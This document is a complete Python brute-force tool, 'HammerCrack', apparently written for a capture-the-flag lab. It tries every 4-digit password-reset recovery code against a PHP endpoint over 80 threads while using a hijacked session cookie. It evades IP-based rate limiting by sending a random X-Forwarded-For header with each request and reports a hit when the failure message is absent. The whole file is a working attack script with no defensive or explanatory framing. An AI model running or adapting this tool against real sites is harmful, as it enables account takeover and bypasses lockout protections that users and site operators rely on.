#!/usr/bin/env python3
# HammerCrack - Recovery-Code Cracker With XFF Rotation
# Minimal prompts, colored UI, see live progress, fixed threads=80

import random, threading
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn, MofNCompleteColumn, SpinnerColumn
from rich.prompt import Prompt

# Change This Part As You Desire #
WORKERS   = 80
FAIL_TEXT = "Invalid or expired recovery code!"  # change if the site uses a different failure message
HIDDEN_S  = ""

console = Console()

def banner():
    console.print(Panel.fit(
        "[bold white]HammerCrack[/] — [cyan]Recovery-Code Cracker With XFF Rotation[/]",
        border_style="magenta"
    ))

def ask_inputs():
    host = Prompt.ask("[bold cyan]IP or domain[/]").strip()
    port = Prompt.ask("[bold cyan]Port[/]", default="1337").strip()
    path = Prompt.ask("[bold cyan]Path[/]", default="/reset_password.php").strip()
    sess = Prompt.ask("[bold cyan]PHPSESSID (your session)[/]").strip()
    return host, port, path, sess

def build_target(host: str, port: str, path: str) -> str:
    base = host
    if not base.startswith(("http://", "https://")):
        base = "http://" + base
    authority = base.split("/")[2]
    if f":{port}" not in authority:
        base = base.replace(authority, f"{authority}:{port}", 1)
    return f"{base}{path}"

def origin_from(target: str) -> str:
    parts = target.split("/")
    return "/".join(parts[:3])

def random_xff() -> str:
    return ".".join(str(random.randint(1, 255)) for _ in range(4))

def main():
    banner()
    host, port, path, sess = ask_inputs()
    target = build_target(host, port, path)

    base_headers = {
        "User-Agent": "Mozilla/5.0 (Linux) HammerCrack/1.0",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": origin_from(target),
        "Referer": target,
        "Connection": "keep-alive",
    }

    stop = threading.Event()
    hit  = {"code": None}

    session = requests.Session()

    def try_code(code: str):
        if stop.is_set():
            return False
        headers = dict(base_headers)
        headers["X-Forwarded-For"] = random_xff()

        data = {"recovery_code": code}
        if HIDDEN_S:
            data["s"] = HIDDEN_S

        try:
            r = session.post(
                target,
                headers=headers,
                cookies={"PHPSESSID": sess},
                data=data,
                timeout=3,
                allow_redirects=False
            )
        except requests.RequestException:
            return False

        body = r.text or ""
        # Success = failure text absent
        ok = (FAIL_TEXT not in body)
        if ok:
            hit["code"] = code
            stop.set()
        return ok

    codes = [f"{i:04d}" for i in range(10000)]

    # Nice live progress
    progress = Progress(
        SpinnerColumn(style="magenta"),
        TextColumn("[bold white]Working[/]"),
        BarColumn(bar_width=None),
        MofNCompleteColumn(),
        TextColumn("•"),
        TextColumn("[cyan]{task.fields[rate]} req/s"),
        TextColumn("•"),
        TimeRemainingColumn(),
        console=console,
        transient=False
    )

    with progress:
        task = progress.add_task("Bruteforcing", total=len(codes), rate=0.0)
        completed = 0

        with ThreadPoolExecutor(max_workers=WORKERS) as pool:
            futures = [pool.submit(try_code, c) for c in codes]
            for fut in as_completed(futures):
                completed += 1
                # Show how many requests/second we run (just an estimate)
                elapsed = progress.tasks[task].elapsed or 0.000001
                rate = round(completed / elapsed, 1)
                progress.update(task, advance=1, rate=rate)

                # If a hit is found, stop early
                if stop.is_set():
                    break

    if hit["code"]:
        console.print(Panel.fit(
            f"[bold green]HIT![/] Recovery code: [bold white]{hit['code']}[/]",
            border_style="green"
        ))
    else:
        console.print(Panel.fit(
            "[bold red]No hit.[/] "
            "[dim]Check PHPSESSID / hidden field / failure text / headers.[/]",
            border_style="red"
        ))

if __name__ == "__main__":
    main()
